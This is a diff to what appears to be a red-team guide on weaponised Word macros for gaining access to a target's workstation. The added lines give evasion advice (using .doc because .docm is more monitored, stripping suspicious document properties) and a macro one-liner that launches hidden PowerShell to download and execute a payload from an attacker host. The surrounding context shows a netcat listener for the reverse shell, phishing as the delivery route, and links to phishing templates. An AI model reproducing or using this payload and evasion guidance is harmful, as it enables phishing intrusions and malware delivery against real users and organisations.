@@ -31,6 +31,7 @@ Create a `.docm` or `.doc` Microsoft Word document and create a new macro.
 
 {: .important }
 > Macros are not enabled in `.docx` documents.
+> You should prefer using `.doc` since `.docm` are more monitored by systems.
 
 ```bash
 ' Macro is automatically executed when the document is opened '
@@ -95,6 +96,19 @@ Now, find a way to put this file on your target’s workstation (phishing, downl
 ```bash
 nc -nvlp 4444
 ```
+
+{: .warning }
+> Do not forget to inspect your document in *File > Info > Inspect Document > Inspect Document* to remove all properties that could look suspicious.
+
+If you're using Cobalt Strike, go in *Attacks > Scripted Web Delivery (S)* to generate the payload and a one-liner you can insert in the document directly.
+
+```bash
+CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http://$lhost/x'))"""
+```
+
+## Useful links
+
+* Microsoft 365 [phishing templates](https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master/Office365) of ZeroPointSecurity.
 
 ## Recommendations
 
